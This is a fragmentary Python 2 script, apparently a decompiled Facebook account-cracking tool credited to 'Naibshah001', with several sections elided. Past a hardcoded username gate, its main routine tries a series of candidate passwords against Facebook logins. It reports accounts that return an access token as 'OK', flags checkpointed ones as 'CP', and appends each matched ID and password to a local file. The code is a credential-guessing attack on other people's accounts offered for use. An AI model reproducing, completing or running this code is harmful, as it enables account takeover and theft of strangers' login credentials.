# coding: utf-8
# Decompiled By Naibshah001
# Github : https://github.com/Naibshah001
# uncompyle6 version 
# Original written By Naibshah001


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
__author__ = 'Naibshah'
__copyright = 'All rights reserved . Copyright  Naibshah001'
CorrectUsername = 'Naibshah001'
os.system('clear')
loop = 'true'
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            ...
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/asia.khna')
            os.system('clear')
            loop = 'false'
    else:
...
logo = """
 ...
 ​Author   :            Naibshah 001
 Facebook :          Badmash Pthan
 ​GitHub   :        github.com/Naibshah001
 ​Version  :              0.9
 ​______________________________________________
 ​                                                 """ 
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [Naib_OK]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [Naib _CP] ' + k + c + user + '  |  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m  [Naib_OK] ' + k + c + user + '  |  ' + pass2
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m  [Naib_OK]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
